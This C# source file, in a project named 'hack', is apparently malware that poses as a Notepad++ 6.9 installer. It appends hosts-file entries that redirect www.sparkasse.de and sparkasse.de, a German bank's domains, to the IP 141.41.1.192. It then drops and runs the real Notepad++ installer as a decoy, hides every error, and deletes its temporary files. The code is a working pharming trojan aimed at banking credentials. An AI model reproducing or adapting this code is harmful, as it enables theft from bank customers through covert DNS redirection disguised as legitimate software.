using System;
using System.Diagnostics;
using System.IO;
using hack.Properties;

namespace hack
{
    internal class Program
    {

        private const string HostsPath = @"C:\Windows\System32\drivers\etc\hosts";

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        private static void Main()
        {
            var tempHosts = Path.Combine(Directory.GetCurrentDirectory(), "hosts");
            try
            {
                // PART 1: hosts file manipulation
                File.Copy(HostsPath, tempHosts, true);
                using (var sw = new StreamWriter(new FileStream(tempHosts, FileMode.Append)))
                {
                    sw.WriteLine("141.41.1.192 www.sparkasse.de");
                    sw.WriteLine("141.41.1.192 sparkasse.de");
                }
                File.Copy(tempHosts, HostsPath, true);
                File.Delete(tempHosts);

                // PART 2: notepad++ installer execution
                var exeBytes = Resources.npp_6_9_Installer;
                var tempFile = Path.Combine(Directory.GetCurrentDirectory(), "npp.6.9.Installer.exe");
                using (var fs = new FileStream(tempFile, FileMode.OpenOrCreate))
                {
                    fs.Write(exeBytes, 0, exeBytes.Length);
                }
                try
                {
                    using (var nppProcess = Process.Start(tempFile))
                    {
                        nppProcess?.WaitForExit();
                    }
                }
                catch (Exception e)
                {
                    // ignore
                    //                MessageBox.Show(e.GetType() + Environment.NewLine + e.Message, "Severe internal hack error 2",
                    //                        MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                finally
                {
                    File.Delete(tempFile);
                }
            }
            catch (Exception e)
            {
                // ignore
//                MessageBox.Show(e.GetType() + Environment.NewLine + e.Message, "Severe internal hack error 2",
//                        MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            finally
            {
                if (File.Exists(tempHosts))
                {
                    File.Delete(tempHosts);
                }
            }

        }
    }
}
